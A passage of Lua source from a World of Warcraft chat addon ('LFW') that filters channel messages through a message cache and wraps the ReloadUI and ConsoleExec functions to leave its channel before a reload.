			return true
		end
	end

	table.insert(cache, 1, { ["id"]=self:GetID(), ["msg"]=message, ["sender"]=sender, ["counter"]=counter, ["time"]=now+LFW_INCOMING_MIN, })
end

ChatFrame_AddMessageEventFilter("CHAT_MSG_CHANNEL", LFW_FilterIncoming);

if AshChat then hooksecurefunc(AshChat, "VARIABLES_LOADED", function() for i = 1, 7 do frame = _G["ChatFrame"..i] frame.AddMessage = AshChat.hooks[frame].AddMessage end end) end

local OriginReloadUI = ReloadUI
local addonName = ...
local function BeforeReload()
    local _, _, _, enabled = GetAddOnInfo(addonName);
    if not enabled then
        SlashCmdList["LFW"]("leave!!");
    end
end
function ReloadUI()
    BeforeReload();
    OriginReloadUI();
end

local OriginConsoleExec = ConsoleExec
function ConsoleExec(cmd, ...)
    if cmd and cmd:lower()=="reloadui" then
        BeforeReload();
    end
    OriginConsoleExec(cmd, ...);
end
